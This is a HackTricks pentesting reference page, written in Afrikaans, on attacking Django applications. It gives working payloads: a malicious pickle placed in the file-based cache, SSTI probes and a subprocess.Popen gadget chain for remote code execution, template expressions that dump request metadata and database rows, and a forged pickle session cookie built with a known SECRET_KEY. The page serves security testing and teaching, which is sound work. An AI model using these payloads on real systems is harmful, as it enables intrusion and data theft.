# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Django se standaardmetode vir cache‑berging is [Python pickles](https://docs.python.org/3/library/pickle.html), wat tot RCE kan lei as [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **As 'n aanvaller skryftoegang tot die cache kry, kan hulle hierdie kwesbaarheid eskaleer na RCE op die onderliggende bediener**.

Django se cache word in een van vier plekke gestoor: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), of 'n [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache wat in 'n Redis‑bediener of database gestoor word, is die waarskynlikste aanvalvektore (Redis injection en SQL injection), maar 'n aanvaller kan ook met file-based cache 'n ewekansige skryf omskep na RCE. Onderhouers het dit as 'n nie‑kwessie aangeteken. Dit is belangrik om te let dat die cache‑lêergids, SQL‑tabelnaam en Redis‑bedienerdetaljes sal verskil na gelang van die implementering.

Op **FileBasedCache** word die pickled waarde geskryf na 'n lêer onder `CACHES['default']['LOCATION']` (dikwels `/var/tmp/django_cache/`). As daardie gids vir almal skryfbaar is of deur 'n aanvaller beheer word, kan die plaas van 'n kwaadwillige pickle onder die verwagte cache‑sleutel kode‑uitvoering oplewer wanneer die app dit lees:
```bash
python - <<'PY'
import pickle, os
class RCE:
def __reduce__(self):
return (os.system, ("id >/tmp/pwned",))
open('/var/tmp/django_cache/cache:malicious', 'wb').write(pickle.dumps(RCE(), protocol=4))
PY
```
This HackerOne-verslag bied 'n uitstekende, reproduseerbare voorbeeld van die uitbuiting van Django cache wat in 'n SQLite-databasis gestoor is: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
Die Django Template Language (DTL) is **Turing-complete**. As deur gebruiker verskafde data as 'n *template string* gerender word (byvoorbeeld deur `Template(user_input).render()` aan te roep of wanneer `|safe`/`format_html()` auto-escaping verwyder), kan 'n aanvaller volle SSTI → RCE bereik.

### Opsporing
1. Kyk vir dinamiese oproepe na `Template()` / `Engine.from_string()` / `render_to_string()` wat *enige* ongesaniteerde versoekdata bevat.
2. Stuur 'n tydgebaseerde of rekenkundige payload:
```django
{{7*7}}
```
As die gerenderde uitvoer `49` bevat, is die inset deur die template engine saamgestel.
3. DTL is **not Jinja2**: rekenkundige/loop-payloads veroorsaak gereeld `TemplateSyntaxError`/500 terwyl hulle steeds evaluasie bewys. Polyglots soos `${{<%[%'"}}%` is goeie crash-or-render probes.

### Context exfiltration when RCE is blocked
Selfs al misluk object-walking na `subprocess.Popen`, openbaar DTL steeds in-scope objekte:
```django
{{ request }}               {# confirm SSTI #}
{{ request.META }}           {# leak Gunicorn/UWSGI headers, cookies, proxy info #}
{{ users }}                  {# QuerySet in the context? #}
{{ users.0 }}                {# first row #}
{{ users.values }}           {# dumps dicts of every column (email/flags/plaintext passwords if stored) #}
```
`QuerySet.values()` dwing rye na dictionaries, om sodoende `__str__` te omseil en alle velde wat deur die queryset teruggegee word, bloot te lê. Dit werk selfs wanneer direkte Python-uitvoering gefilter is.

**Outomatiseringspatroon**: authenticate, haal die CSRF token, stoor 'n payload met 'marker' as voorvoegsel in enige permanente veld (bv. username/profile bio), en versoek dan 'n view wat dit render (AJAX endpoints soos `/likes/<id>` is algemeen). Parseer 'n stabiele attribuut (bv. `title="..."`) om die gerenderde resultaat te herwin en herhaal payloads.

### Van primitiewe na RCE
Django blokkeer direkte toegang tot `__import__`, maar die Python-objekgrafiek is bereikbaar:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Vind die indeks van `subprocess.Popen` (≈400–500, afhangend van die Python build) en voer ewekansige opdragte uit:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
'n Veiliger universele gadget is om te herhaal totdat `cls.__name__ == 'Popen'`.

Dieselfde gadget werk vir **Debug Toolbar** of **Django-CMS** sjabloon-weergavefunksies wat gebruikerinvoer verkeerd hanteer.

---

### Ook sien: ReportLab/xhtml2pdf PDF export RCE
Toepassings wat op Django gebou is, integreer dikwels xhtml2pdf/ReportLab om views as PDF uit te voer. Wanneer deur gebruiker beheerde HTML in PDF-generering vloei, kan rl_safe_eval uitdrukkings binne driedubbele hakies `[[[ ... ]]]` evalueer, wat kode-uitvoering moontlik maak (CVE-2023-33733). Besonderhede, payloads, en mitigasies:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
As die instelling `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` aangeskakel is (of 'n pasgemaakte serializer wat pickle deserialiseer), *ontkod en deserialiseer* Django die sessie-koekie **voordat** enige view-kode aangeroep word. Daarom is die inbesit van 'n geldige signing key (die projek `SECRET_KEY` volgens verstek) genoeg vir onmiddellike remote code execution.

### Vereistes vir Exploit
* Die bediener gebruik `PickleSerializer`.
* Die aanvaller weet / kan `settings.SECRET_KEY` raai (leaks via GitHub, `.env`, foutbladsye, ens.).

### Bewys van konsep
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Stuur die resulterende cookie, en die payload word uitgevoer met die permissies van die WSGI worker.

**Mitigering**: Hou by die standaard `JSONSerializer`, roteer `SECRET_KEY`, en konfigureer `SESSION_COOKIE_HTTPONLY`.

---

## Onlangs (2023-2025) Hoë-impak Django CVEs wat Pentesters moet nagaan
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (gefix op 4 Junie 2025). Laat aanvallers toe om nuwe reëls/ANSI-kodes in loglêers in te smokkel en downstream log-analise te bederf. Patshvlak ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). Skep JSON-sleutels om uit aanhaling te breek en arbitrêre SQL uit te voer. Gerepareer in 4.2.15 / 5.0.8.

Fingerprint altyd die presiese framework-weergawe via die `X-Frame-Options` foutbladsy of die `/static/admin/css/base.css` hash, en toets bogenoemde waar toepaslik.

---

## Verwysings
* Django sekuriteitsvrystelling – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Junie 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Augustus 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
* Django docs – QuerySet.values(): [https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values](https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values)
* 0xdf: HackNet (HTB) — HTML Attribute Injection → Django SSTI → QuerySet.values data dump → Pickle FileBasedCache RCE – [https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html](https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html)

{{#include ../../banners/hacktricks-training.md}}
